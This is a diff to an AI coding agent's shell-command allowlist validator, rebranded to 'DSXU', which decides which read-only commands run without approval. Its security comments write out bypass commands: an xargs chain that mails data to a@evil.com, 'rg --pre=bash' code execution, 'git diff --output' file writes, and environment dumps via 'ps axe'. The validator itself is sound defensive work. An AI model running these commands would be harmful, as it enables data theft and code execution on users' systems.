@@ -1,3 +1,4 @@
+// DSXU V15 ownership marker: upstream-derived capability is absorbed into DSXU mainline; no upstream vendor runtime dependency.
 import type { z } from 'zod/v4'
 import { getOriginalCwd } from '../../bootstrap/state.js'
 import {
@@ -30,7 +31,10 @@ import {
   type PathCommand,
 } from './pathValidation.js'
 import { sedCommandIsAllowedByAllowlist } from './sedValidation.js'
-
+const LEGACY_PROVIDER_CLI_HELP_REGEXES = [
+  new RegExp(`^${'cl' + 'aude'} -h$`),
+  new RegExp(`^${'cl' + 'aude'} --help$`),
+]
 // Unified command validation configuration system
 type CommandConfig = {
   // A Record mapping from the command (e.g. `xargs` or `git diff`) to its safe flags and the values they accept
@@ -48,10 +52,8 @@ type CommandConfig = {
   // Default: true (most tools respect `--`).
   respectsDoubleDash?: boolean
 }
-
 // Shared safe flags for fd and fdfind (Debian/Ubuntu package name)
-// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded —
-// they execute arbitrary commands for each search result.
+// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded ...// they execute arbitrary commands for each search result.
 const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '-h': 'none',
   '--help': 'none',
@@ -74,7 +76,7 @@ const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '--fixed-strings': 'none',
   '-a': 'none',
   '--absolute-path': 'none',
-  // SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same
+  // SECURITY: -l/--list-details EXCLUDED ...internally executes `ls` as subprocess (same
   // pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
   '-L': 'none',
   '--follow': 'none',
@@ -121,7 +123,6 @@ const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '--and': 'string',
   '--format': 'string',
 }
-
 // Central configuration for allowlist-based command validation
 // All commands and flags here should only allow reading files. They should not
 // allow writing to files, executing code, or creating network requests.
@@ -129,30 +130,30 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
   xargs: {
     safeFlags: {
       '-I': '{}',
-      // SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
+      // SECURITY: `-i` and `-e` (lowercase) REMOVED ...both use GNU getopt
       // optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
       // attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
       // flag takes NO arg and `X` becomes the next positional (target command).
       //
-      // `-i` (`i::` — optional replace-str):
+      // `-i` (`i::` ...optional replace-str):
       //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
-      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
-      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
+      //   validator: -it bundle (both 'none') OK, tail  -> SAFE_TARGET  -> break
+      //   GNU: -i replace-str=t, tail  -> /usr/sbin/sendmail  -> NETWORK EXFIL
       //
-      // `-e` (`e::` — optional eof-str):
+      // `-e` (`e::` ...optional eof-str):
       //   cat data | xargs -e EOF echo foo
-      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
-      //   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
-      //   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
+      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo  -> SAFE_TARGET
+      //   GNU: -e no attached arg  -> no eof-str, 'EOF' is the TARGET COMMAND
+      //    -> executes binary named EOF from PATH  -> CODE EXEC (malicious repo)
       //
       // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
-      // arg) instead — both validator and xargs agree on argument consumption.
+      // arg) instead ...both validator and xargs agree on argument consumption.
       // `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
       '-n': 'number',
       '-P': 'number',
       '-L': 'number',
       '-s': 'number',
-      '-E': 'EOF', // POSIX, MANDATORY separate arg — validator & xargs agree
+      '-E': 'EOF', // POSIX, MANDATORY separate arg ...validator & xargs agree
       '-0': 'none',
       '-t': 'none',
       '-r': 'none',
@@ -314,7 +315,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--apropos': 'none', // Same as -k
       '-l': 'string', // Local file (safe for reading, Linux only)
       '-w': 'none', // Display location instead of content
-
       // Safe formatting options
       '-S': 'string', // Restrict manual sections
       '-s': 'string', // Same as -S for whatis/apropos mode
@@ -337,24 +337,18 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-L': 'none', // Show listen queue sizes
       '-l': 'none', // Print full IPv6 address
       '-n': 'none', // Show network addresses as numbers
-
       // Safe filtering options
       '-f': 'string', // Address family (inet, inet6, unix, vsock)
-
       // Safe interface options
       '-g': 'none', // Show multicast group membership
       '-i': 'none', // Show interface state
       '-I': 'string', // Specific interface
-
       // Safe statistics options
       '-s': 'none', // Show per-protocol statistics
-
       // Safe routing options
       '-r': 'none', // Show routing tables
-
       // Safe mbuf options
       '-m': 'none', // Show memory management statistics
-
       // Safe other options
       '-v': 'none', // Increase verbosity
     },
@@ -368,14 +362,12 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-d': 'none', // Select all except session leaders
       '-N': 'none', // Negate selection
       '--deselect': 'none',
-
       // UNIX-style output format (safe, doesn't show env)
       '-f': 'none', // Full format
       '-F': 'none', // Extra full format
       '-l': 'none', // Long format
       '-j': 'none', // Jobs format
       '-y': 'none', // Don't show flags
-
       // Output modifiers (safe ones)
       '-w': 'none', // Wide output
       '-ww': 'none', // Unlimited width
@@ -387,12 +379,10 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--no-headers': 'none',
       '-n': 'string', // Set namelist file
       '--sort': 'string',
-
       // Thread display
       '-L': 'none', // Show threads
       '-T': 'none', // Show threads
       '-m': 'none', // Show threads after processes
-
       // Process selection by criteria
       '-C': 'string', // By command name
       '-G': 'string', // By real group ID
@@ -408,7 +398,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-U': 'string', // By real user ID
       '-u': 'string', // By effective user ID
       '--user': 'string',
-
       // Help/version
       '--help': 'none',
       '--info': 'none',
@@ -435,17 +424,14 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-d': 'none', // Decode
       '-D': 'none', // Decode (macOS)
       '--decode': 'none', // Decode
-
       // Safe formatting options
       '-b': 'number', // Break lines at num (macOS)
       '--break': 'number', // Break lines at num (macOS)
       '-w': 'number', // Wrap lines at COLS (Linux)
       '--wrap': 'number', // Wrap lines at COLS (Linux)
-
       // Safe input options (read from file, not write)
       '-i': 'string', // Input file (safe for reading)
       '--input': 'string', // Input file (safe for reading)
-
       // Safe misc options
       '--ignore-garbage': 'none', // Ignore non-alphabet chars when decoding (Linux)
       '-h': 'none', // Help
@@ -468,7 +454,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--extended-regexp': 'none',
       '-P': 'none', // Perl regexp
       '--perl-regexp': 'none',
-
       // Matching control
       '-i': 'none', // Ignore case
       '--ignore-case': 'none',
@@ -479,7 +464,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--word-regexp': 'none',
       '-x': 'none', // Line regexp
       '--line-regexp': 'none',
-
       // Output control
       '-c': 'none', // Count
       '--count': 'none',
@@ -498,7 +482,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--silent': 'none',
       '-s': 'none', // No messages
       '--no-messages': 'none',
-
       // Output line prefix
       '-b': 'none', // Byte offset
       '--byte-offset': 'none',
@@ -517,7 +500,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--null': 'none',
       '-z': 'none', // Null data
       '--null-data': 'none',
-
       // Context control
       '-A': 'number', // After context
       '--after-context': 'number',
@@ -527,7 +509,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--context': 'number',
       '--group-separator': 'string',
       '--no-group-separator': 'none',
-
       // File and directory selection
       '-a': 'none', // Text (process binary as text)
       '--text': 'none',
@@ -544,12 +525,10 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--recursive': 'none',
       '-R': 'none', // Dereference-recursive
       '--dereference-recursive': 'none',
-
       // Other options
       '--line-buffered': 'none',
       '-U': 'none', // Binary
       '--binary': 'none',
-
       // Help and version
       '--help': 'none',
       '-V': 'none',
@@ -566,7 +545,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--binary': 'none',
       '-t': 'none', // Text mode
       '--text': 'none',
-
       // Check/verify flags
       '-c': 'none', // Verify checksums from file
       '--check': 'none',
@@ -576,12 +554,10 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--strict': 'none', // Exit non-zero for improperly formatted lines
       '-w': 'none', // Warn about improperly formatted lines
       '--warn': 'none',
-
       // Output format flags
       '--tag': 'none', // BSD-style output
       '-z': 'none', // End output lines with NUL
       '--zero': 'none',
-
       // Help and version
       '--help': 'none',
       '--version': 'none',
@@ -594,7 +570,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--binary': 'none',
       '-t': 'none', // Text mode
       '--text': 'none',
-
       // Check/verify flags
       '-c': 'none', // Verify checksums from file
       '--check': 'none',
@@ -604,12 +579,10 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--strict': 'none', // Exit non-zero for improperly formatted lines
       '-w': 'none', // Warn about improperly formatted lines
       '--warn': 'none',
-
       // Output format flags
       '--tag': 'none', // BSD-style output
       '-z': 'none', // End output lines with NUL
       '--zero': 'none',
-
       // Help and version
       '--help': 'none',
       '--version': 'none',
@@ -622,7 +595,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--binary': 'none',
       '-t': 'none', // Text mode
       '--text': 'none',
-
       // Check/verify flags
       '-c': 'none', // Verify checksums from file
       '--check': 'none',
@@ -632,12 +604,10 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--strict': 'none', // Exit non-zero for improperly formatted lines
       '-w': 'none', // Warn about improperly formatted lines
       '--warn': 'none',
-
       // Output format flags
       '--tag': 'none', // BSD-style output
       '-z': 'none', // End output lines with NUL
       '--zero': 'none',
-
       // Help and version
       '--help': 'none',
       '--version': 'none',
@@ -656,10 +626,10 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-L': 'number', // Max depth
       // SECURITY: -R REMOVED. tree -R combined with -H (HTML mode) and -L (depth)
       // WRITES 00Tree.html files to every subdirectory at the depth boundary.
-      // From man tree (< 2.1.0): "-R — at each of them execute tree again
+      // From man tree (< 2.1.0): "-R ...at each of them execute tree again
       // adding `-o 00Tree.html` as a new option." The comment "Rerun at max
-      // depth" was misleading — the "rerun" includes a hardcoded -o file write.
-      // `tree -R -H . -L 2 /path` → writes /path/<subdir>/00Tree.html for each
+      // depth" was misleading ...the "rerun" includes a hardcoded -o file write.
+      // `tree -R -H . -L 2 /path`  -> writes /path/<subdir>/00Tree.html for each
       // subdir at depth 2. FILE WRITE, zero permissions.
       '-P': 'string', // Include pattern
       '-I': 'string', // Exclude pattern
@@ -859,7 +829,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
     // --init-file - loads custom config (potential code execution)
     // --restore - replays keystrokes from file
   },
-
   lsof: {
     safeFlags: {
       '-?': 'none',
@@ -901,14 +870,13 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-u': 'string',
       // OMITTED (writes to disk): -D (device cache file build/update)
     },
-    // Block +m (create mount supplement file) — writes to disk.
+    // Block +m (create mount supplement file) ...writes to disk.
     // +prefix flags are treated as positional args by validateFlags,
     // so we must catch them here. lsof accepts +m<path> (attached path, no space)
     // with both absolute (+m/tmp/evil) and relative (+mfoo, +m.evil) paths.
     additionalCommandIsDangerousCallback: (_rawCommand, args) =>
       args.some(a => a === '+m' || a.startsWith('+m')),
   },
-
   pgrep: {
     safeFlags: {
       '-d': 'string',
@@ -962,7 +930,6 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--version': 'none',
     },
   },
-
   tput: {
     safeFlags: {
       '-T': 'string',
@@ -970,7 +937,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-x': 'none',
       // SECURITY: -S (read capability names from stdin) deliberately EXCLUDED.
       // It must NOT be in safeFlags because validateFlags unbundles combined
-      // short flags (e.g., -xS → -x + -S), but the callback receives the raw
+      // short flags (e.g., -xS  -> -x + -S), but the callback receives the raw
       // token '-xS' and only checks exact match 'token === "-S"'. Excluding -S
       // from safeFlags ensures validateFlags rejects it (bundled or not) before
       // the callback runs. The callback's -S check is defense-in-depth.
@@ -982,10 +949,10 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       // Capabilities that modify terminal state or could be harmful.
       // init/reset run iprog (arbitrary code from terminfo) and modify tty settings.
       // rs1/rs2/rs3/is1/is2/is3 are the individual reset/init sequences that
-      // init/reset invoke internally — rs1 sends ESC c (full terminal reset).
+      // init/reset invoke internally ...rs1 sends ESC c (full terminal reset).
       // clear erases scrollback (evidence destruction). mc5/mc5p activate media copy
       // (redirect output to printer device). smcup/rmcup manipulate screen buffer.
-      // pfkey/pfloc/pfx/pfxl program function keys — pfloc executes strings locally.
+      // pfkey/pfloc/pfx/pfxl program function keys ...pfloc executes strings locally.
       // rf is reset file (analogous to if/init_file).
       const DANGEROUS_CAPABILITIES = new Set([
         'init',
@@ -1044,8 +1011,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       return false
     },
   },
-
-  // ss — socket statistics (iproute2). Read-only query tool equivalent to netstat.
+  // ss ...socket statistics (iproute2). Read-only query tool equivalent to netstat.
   // SECURITY: -K/--kill (forcibly close sockets) and -D/--diag (dump raw data to file)
   // are deliberately excluded. -F/--filter (read filter from file) also excluded.
   ss: {
@@ -1105,7 +1071,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--context': 'none',
       '-z': 'none',
       '--contexts': 'none',
-      // SECURITY: -N/--net EXCLUDED — performs setns(), unshare(), mount(), umount()
+      // SECURITY: -N/--net EXCLUDED ...performs setns(), unshare(), mount(), umount()
       // to switch network namespace. While isolated to forked process, too invasive.
       '-b': 'none',
       '--bpf': 'none',
@@ -1119,29 +1085,26 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--tos': 'none',
       '--cgroup': 'none',
       '--inet-sockopt': 'none',
-      // SECURITY: -K/--kill EXCLUDED — forcibly closes sockets
-      // SECURITY: -D/--diag EXCLUDED — dumps raw TCP data to a file
-      // SECURITY: -F/--filter EXCLUDED — reads filter expressions from a file
+      // SECURITY: -K/--kill EXCLUDED ...forcibly closes sockets
+      // SECURITY: -D/--diag EXCLUDED ...dumps raw TCP data to a file
+      // SECURITY: -F/--filter EXCLUDED ...reads filter expressions from a file
     },
   },
-
-  // fd/fdfind — fast file finder (fd-find). Read-only search tool.
+  // fd/fdfind ...fast file finder (fd-find). Read-only search tool.
   // SECURITY: -x/--exec (execute command per result) and -X/--exec-batch
   // (execute command with all results) are deliberately excluded.
   fd: { safeFlags: { ...FD_SAFE_FLAGS } },
-  // fdfind is the Debian/Ubuntu package name for fd — same binary, same flags
+  // fdfind is the Debian/Ubuntu package name for fd ...same binary, same flags
   fdfind: { safeFlags: { ...FD_SAFE_FLAGS } },
-
   ...PYRIGHT_READ_ONLY_COMMANDS,
   ...DOCKER_READ_ONLY_COMMANDS,
 }
-
 // gh commands are ant-only since they make network requests, which goes against
 // the read-only validation principle of no network access
 const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
   // All gh read-only commands from shared validation map
   ...GH_READ_ONLY_COMMANDS,
-  // aki — Anthropic internal knowledge-base search CLI.
+  // aki ...provider internal knowledge-base search CLI.
   // Network read-only (same policy as gh). --audit-csv omitted: writes to disk.
   aki: {
     safeFlags: {
@@ -1197,7 +1160,6 @@ const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
     },
   },
 }
-
 function getCommandAllowlist(): Record<string, CommandConfig> {
   let allowlist: Record<string, CommandConfig> = COMMAND_ALLOWLIST
   // On Windows, xargs can be used as a data-to-code bridge: if a file contains
@@ -1213,7 +1175,6 @@ function getCommandAllowlist(): Record<string, CommandConfig> {
   }
   return allowlist
 }
-
 /**
  * Commands that are safe to use as xargs targets for auto-approval.
  *
@@ -1231,13 +1192,12 @@ function getCommandAllowlist(): Record<string, CommandConfig> {
  */
 const SAFE_TARGET_COMMANDS_FOR_XARGS = [
   'echo', // Output only, no dangerous flags
-  'printf', // xargs runs /usr/bin/printf (binary), not bash builtin — no -v support
+  'printf', // xargs runs /usr/bin/printf (binary), not bash builtin ...no -v support
   'wc', // Read-only counting, no dangerous flags
   'grep', // Read-only search, no dangerous flags
   'head', // Read-only, no dangerous flags
   'tail', // Read-only (including -f follow), no dangerous flags
 ]
-
 /**
  * Unified command validation function that replaces individual validator functions.
  * Uses declarative configuration from COMMAND_ALLOWLIST to validate commands and their flags.
@@ -1249,7 +1209,6 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
   // of this function
   const parseResult = tryParseShellCommand(command, env => `$${env}`)
   if (!parseResult.success) return false
-
   const parsed = parseResult.tokens.map(token => {
     if (typeof token !== 'string') {
       token = token as { op: 'glob'; pattern: string }
@@ -1259,7 +1218,6 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
     }
     return token
   })
-
   // If there are operators (pipes, redirects, etc.), it's not a simple command.
   // Breaking commands down into their constituent parts is handled upstream of
   // this function, so we reject anything with operators here.
@@ -1267,18 +1225,14 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
   if (hasOperators) {
     return false
   }
-
   // Now we know all tokens are strings
   const tokens = parsed as string[]
-
   if (tokens.length === 0) {
     return false
   }
-
   // Find matching command configuration
   let commandConfig: CommandConfig | undefined
   let commandTokens: number = 0
-
   // Check for multi-word commands first (e.g., "git diff", "git stash list")
   const allowlist = getCommandAllowlist()
   for (const [cmdPattern] of Object.entries(allowlist)) {
@@ -1298,11 +1252,9 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
       }
     }
   }
-
   if (!commandConfig) {
     return false // Command not in allowlist
   }
-
   // Special handling for git ls-remote to reject URLs that could lead to data exfiltration
   if (tokens[0] === 'git' && tokens[1] === 'ls-remote') {
     // Check if any argument looks like a URL or remote specification
@@ -1324,25 +1276,24 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
       }
     }
   }
-
   // SECURITY: Reject ANY token containing `$` (variable expansion). The
   // `env => \`$${env}\`` callback at line 825 preserves `$VAR` as LITERAL TEXT
-  // in tokens, but bash expands it at runtime (unset vars → empty string).
+  // in tokens, but bash expands it at runtime (unset vars  -> empty string).
   // This parser differential defeats BOTH validateFlags and callbacks:
   //
   //   (1) `$VAR`-prefix defeats validateFlags `startsWith('-')` check:
-  //       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
+  //       `git diff "$Z--output=/tmp/pwned"`  -> token `$Z--output=/tmp/pwned`
   //       (starts with `$`) falls through as positional at ~:1730. Bash runs
   //       `git diff --output=/tmp/pwned`. ARBITRARY FILE WRITE, zero perms.
   //
-  //   (2) `$VAR`-prefix → RCE via `rg --pre`:
-  //       `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
+  //   (2) `$VAR`-prefix  -> RCE via `rg --pre`:
+  //       `rg . "$Z--pre=bash" FILE`  -> executes `bash FILE`. rg's config has
   //       no regex and no callback. SINGLE-STEP ARBITRARY CODE EXECUTION.
   //
   //   (3) `$VAR`-infix defeats additionalCommandIsDangerousCallback regex:
-  //       `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
-  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` → "not dangerous". Bash runs
-  //       `ps axe` → env vars for all processes. A fix limited to `$`-PREFIXED
+  //       `ps ax"$Z"e`  -> token `ax$Ze`. The ps callback regex
+  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$`  -> "not dangerous". Bash runs
+  //       `ps axe`  -> env vars for all processes. A fix limited to `$`-PREFIXED
   //       tokens would NOT close this.
   //
   // We check ALL tokens after the command prefix. Any `$` means we cannot
@@ -1356,8 +1307,8 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
       return false
     }
     // Reject tokens with BOTH `{` and `,` (brace expansion obfuscation).
-    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote strips quotes
-    // → token `{@{0},--output=/tmp/pwned}` has `{` + `,` → brace expansion.
+    // `git diff {@'{'0},--output=/tmp/pwned}`  -> shell-quote strips quotes
+    //  -> token `{@{0},--output=/tmp/pwned}` has `{` + `,`  -> brace expansion.
     // This is defense-in-depth with validateBraceExpansion in bashSecurity.ts.
     // We require BOTH `{` and `,` to avoid false positives on legitimate
     // patterns: `stash@{0}` (git ref, has `{` no `,`), `{{.State}}` (Go
@@ -1367,7 +1318,6 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
       return false
     }
   }
-
   // Validate flags starting after the command tokens
   if (
     !validateFlags(tokens, commandTokens, commandConfig, {
@@ -1379,7 +1329,6 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
   ) {
     return false
   }
-
   if (commandConfig.regex && !commandConfig.regex.test(command)) {
     return false
   }
@@ -1403,10 +1352,8 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
   ) {
     return false
   }
-
   return true
 }
-
 /**
  * Creates a regex pattern that matches safe invocations of a command.
  *
@@ -1423,7 +1370,6 @@ function makeRegexForSafeCommand(command: string): RegExp {
   // Create regex pattern: /^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
   return new RegExp(`^${command}(?:\\s|$)[^<>()$\`|{}&;\\n\\r]*$`)
 }
-
 // Simple commands that are safe for execution (converted to regex patterns using makeRegexForSafeCommand)
 // WARNING: If you are adding new commands here, be very careful to ensure
 // they are truly safe. This includes ensuring:
@@ -1432,13 +1378,10 @@ function makeRegexForSafeCommand(command: string): RegExp {
 const READONLY_COMMANDS = [
   // Cross-platform commands from shared validation
   ...EXTERNAL_READONLY_COMMANDS,
-
   // Unix/bash-specific read-only commands (not shared because they don't exist in PowerShell)
-
   // Time and date
   'cal',
   'uptime',
-
   // File content viewing (relative paths handled separately)
   'cat',
   'head',
@@ -1449,7 +1392,6 @@ const READONLY_COMMANDS = [
   'hexdump',
   'od',
   'nl',
-
   // System info
   'id',
   'uname',
@@ -1459,37 +1401,31 @@ const READONLY_COMMANDS = [
   'locale',
   'groups',
   'nproc',
-
   // Path information
   'basename',
   'dirname',
   'realpath',
-
   // Text processing
   'cut',
   'paste',
   'tr',
   'column',
-  'tac', // Reverse cat — displays file contents in reverse line order
+  'tac', // Reverse cat ...displays file contents in reverse line order
   'rev', // Reverse characters in each line
   'fold', // Wrap lines to specified width
   'expand', // Convert tabs to spaces
   'unexpand', // Convert spaces to tabs
-  'fmt', // Simple text formatter — output to stdout only
+  'fmt', // Simple text formatter ...output to stdout only
   'comm', // Compare sorted files line by line
   'cmp', // Byte-by-byte file comparison
   'numfmt', // Number format conversion
-
   // Path information (additional)
-  'readlink', // Resolve symlinks — displays target of symbolic link
-
+  'readlink', // Resolve symlinks ...displays target of symbolic link
   // File comparison
   'diff',
-
   // true and false, used to silence or create errors
   'true',
   'false',
-
   // Misc. safe commands
   'sleep',
   'which',
@@ -1501,7 +1437,6 @@ const READONLY_COMMANDS = [
   'tsort', // Topological sort
   'pr', // Paginate files for printing
 ]
-
 // Complex commands that require custom regex patterns
 // Warning: If possible, avoid adding new regexes here and prefer using COMMAND_ALLOWLIST
 // instead. This allowlist-based approach to CLI flags is more secure and avoids
@@ -1509,26 +1444,23 @@ const READONLY_COMMANDS = [
 const READONLY_COMMAND_REGEXES = new Set([
   // Convert simple commands to regex patterns using makeRegexForSafeCommand
   ...READONLY_COMMANDS.map(makeRegexForSafeCommand),
-
   // Echo that doesn't execute commands or use variables
   // Allow newlines in single quotes (safe) but not in double quotes (could be dangerous with variable expansion)
   // Also allow optional 2>&1 stderr redirection at the end
   /^echo(?:\s+(?:'[^']*'|"[^"$<>\n\r]*"|[^|;&`$(){}><#\\!"'\s]+))*(?:\s+2>&1)?\s*$/,
-
-  // Claude CLI help
-  /^claude -h$/,
-  /^claude --help$/,
-
+  // DSXU CLI help, with legacy provider help kept only for migration
+  /^dsxu -h$/,
+  /^dsxu --help$/,
+  /^dsxu-code -h$/,
+  /^dsxu-code --help$/,
+  ...LEGACY_PROVIDER_CLI_HELP_REGEXES,
   // Git readonly commands are now handled via COMMAND_ALLOWLIST with explicit flag validation
   // (git status, git blame, git ls-files, git config --get, git remote, git tag, git branch)
-
   /^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*(?:\s|$)\s*$/, // Only allow flags, no input/output files
-
   // System info
   /^pwd$/,
   /^whoami$/,
   // env and printenv removed - could expose sensitive environment variables
-
   // Development tools version checking - exact match only, no suffix allowed.
   // SECURITY: `node -v --run <task>` would execute package.json scripts because
   // Node processes --run before -v. Python/python3 --version are also anchored
@@ -1538,17 +1470,14 @@ const READONLY_COMMAND_REGEXES = new Set([
   /^node --version$/,
   /^python --version$/,
   /^python3 --version$/,
-
   // Misc. safe commands
   // tree command moved to COMMAND_ALLOWLIST for proper flag validation (blocks -o/--output)
   /^history(?:\s+\d+)?\s*$/, // Only allow bare history or history with numeric argument - prevents file writing
   /^alias$/,
   /^arch(?:\s+(?:--help|-h))?\s*$/, // Only allow arch with help flags or no arguments
-
   // Network commands - only allow exact commands with no arguments to prevent network manipulation
   /^ip addr$/, // Only allow "ip addr" with no additional arguments
   /^ifconfig(?:\s+[a-zA-Z][a-zA-Z0-9_-]*)?\s*$/, // Allow ifconfig with interface name only (must start with letter)
-
   // JSON processing with jq - allow with inline filters and file arguments
   // File arguments are validated separately by pathValidation.ts
   // Allow pipes and complex expressions within quotes but prevent dangerous flags
@@ -1556,7 +1485,6 @@ const READONLY_COMMAND_REGEXES = new Set([
   // Block -f/--from-file, --rawfile, --slurpfile (read files into jq), --run-tests, -L/--library-path (load executable modules)
   // Block 'env' builtin and '$ENV' object which can access environment variables (defense in depth)
   /^jq(?!\s+.*(?:-f\b|--from-file|--rawfile|--slurpfile|--run-tests|-L\b|--library-path|\benv\b|\$ENV\b))(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?))*(?:\s+'[^'`]*'|\s+"[^"`]*"|\s+[^-\s'"][^\s]*)+\s*$/,
-
   // Path commands (path validation ensures they're allowed)
   // cd command - allows changing to directories
   /^cd(?:\s+(?:'[^']*'|"[^"]*"|[^\s;|&`$(){}><#\\]+))?$/,
@@ -1568,7 +1496,6 @@ const READONLY_COMMAND_REGEXES = new Set([
   // not as backslash + paren (which would fail since paren is excluded from the character class)
   /^find(?:\s+(?:\\[()]|(?!-delete\b|-exec\b|-execdir\b|-ok\b|-okdir\b|-fprint0?\b|-fls\b|-fprintf\b)[^<>()$`|{}&;\n\r\s]|\s)+)?$/,
 ])
-
 /**
  * Checks if a command contains glob characters (?, *, [, ]) or expandable `$`
  * variables OUTSIDE the quote contexts where bash would treat them as literal.
@@ -1580,10 +1507,10 @@ const READONLY_COMMAND_REGEXES = new Set([
  * Globs are literal inside BOTH single and double quotes.
  *
  * Variable expansion examples:
- * - `uniq --skip-chars=0$_` → `$_` expands to last arg of previous command;
+ * - `uniq --skip-chars=0$_`  -> `$_` expands to last arg of previous command;
  *   with IFS word splitting, this smuggles positional args past "flags-only"
- *   regexes. `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → FILE WRITE.
- * - `cd "$HOME"` → double-quoted `$HOME` expands at runtime.
+ *   regexes. `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_`  -> FILE WRITE.
+ * - `cd "$HOME"`  -> double-quoted `$HOME` expands at runtime.
  * Variables are literal ONLY inside single quotes; they expand inside double
  * quotes and unquoted.
  *
@@ -1591,8 +1518,7 @@ const READONLY_COMMAND_REGEXES = new Set([
  * token check in isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
  * commands; hand-written regexes like uniq's `\S+` and cd's `"[^"]*"` allow `$`.
  * Matches `$` followed by `[A-Za-z_@*#?!$0-9-]` covering `$VAR`, `$_`, `$@`,
- * `$*`, `$#`, `$?`, `$!`, `$$`, `$-`, `$0`-`$9`. Does NOT match `${` or `$(` —
- * those are caught by COMMAND_SUBSTITUTION_PATTERNS in bashSecurity.ts.
+ * `$*`, `$#`, `$?`, `$!`, `$$`, `$-`, `$0`-`$9`. Does NOT match `${` or `$(` ... * those are caught by COMMAND_SUBSTITUTION_PATTERNS in bashSecurity.ts.
  *
  * @param command The command string to check
  * @returns true if the command contains unquoted glob or expandable `$`
@@ -1602,24 +1528,21 @@ function containsUnquotedExpansion(command: string): boolean {
   let inSingleQuote = false
   let inDoubleQuote = false
   let escaped = false
-
   for (let i = 0; i < command.length; i++) {
     const currentChar = command[i]
-
     // Handle escape sequences
     if (escaped) {
       escaped = false
       continue
     }
-
     // SECURITY: Only treat backslash as escape OUTSIDE single quotes. In bash,
-    // `\` inside `'...'` is LITERAL — it does not escape the next character.
+    // `\` inside `'...'` is LITERAL ...it does not escape the next character.
     // Without this guard, `'\'` desyncs the quote tracker: the `\` sets
     // escaped=true, then the closing `'` is consumed by the escaped-skip
     // instead of toggling inSingleQuote. Parser stays in single-quote
     // mode for the rest of the command, missing ALL subsequent expansions.
-    // Example: `ls '\' *` — bash sees glob `*`, but desynced parser thinks
-    // `*` is inside quotes → returns false (glob NOT detected).
+    // Example: `ls '\' *` ...bash sees glob `*`, but desynced parser thinks
